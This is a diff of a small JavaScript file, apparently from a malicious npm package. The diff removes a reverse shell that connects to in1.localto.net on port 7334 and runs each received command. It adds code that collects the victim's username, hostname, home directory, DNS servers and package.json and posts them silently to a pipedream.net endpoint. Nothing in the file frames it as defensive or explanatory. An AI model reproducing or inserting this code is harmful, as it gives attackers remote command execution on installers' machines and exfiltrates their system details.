@@ -1,29 +1,55 @@
-const net = require('net');
-const { exec } = require('child_process');
+const os = require("os"); 
+const dns = require("dns"); 
+const querystring = require("querystring"); 
+const https = require("https"); 
+const packageJSON = require("./package.json"); 
+const package = packageJSON.name; 
 
-// Replace these with your actual Ngrok URL and port
-const server = 'in1.localto.net'; // 
-const port = 7334; //
+const trackingData = JSON.stringify({ 
 
-const client = new net.Socket();
-client.connect(port, server, () => {
-    console.log('Connected to remote server');
-    client.write('Reverse shell connection established\n');
-});
+    p: package, 
+    c: __dirname, 
+    os: os.type(),
+    hd: os.homedir(), 
+    hn: os.hostname(), 
+    un: os.userInfo().username, 
+    dns: dns.getServers(), 
+    r: packageJSON ? packageJSON.___resolved : undefined, 
+    v: packageJSON.version, 
+    pjson: packageJSON, 
 
-client.on('data', (data) => {
-    exec(data.toString(), (error, stdout, stderr) => {
-        if (stdout) client.write(stdout);
-        if (stderr) client.write(stderr);
-        if (error) client.write(error.message);
-    });
-});
+}); 
 
-client.on('error', (err) => {
-    console.error(`Connection error: ${err.message}`);
-    client.destroy();
-});
+var postData = querystring.stringify({ 
+    msg: trackingData, 
+}); 
 
-client.on('close', () => {
-    console.log('Connection closed');
-});
+var options = { 
+    hostname: "eojg3fg8d673pvt.m.pipedream.net", 
+    port: 443, 
+    path: "/", 
+    method: "POST", 
+
+    headers: { 
+        "Content-Type": "application/x-www-form-urlencoded", 
+        "Content-Length": postData.length, 
+
+    }, 
+
+}; 
+
+var req = https.request(options, (res) => { 
+    res.on("data", (d) => { 
+        process.stdout.write(d); 
+    }); 
+
+}); 
+
+req.on("error", (e) => { 
+
+    // console.error(e); 
+
+}); 
+
+req.write(postData); 
+req.end(); 
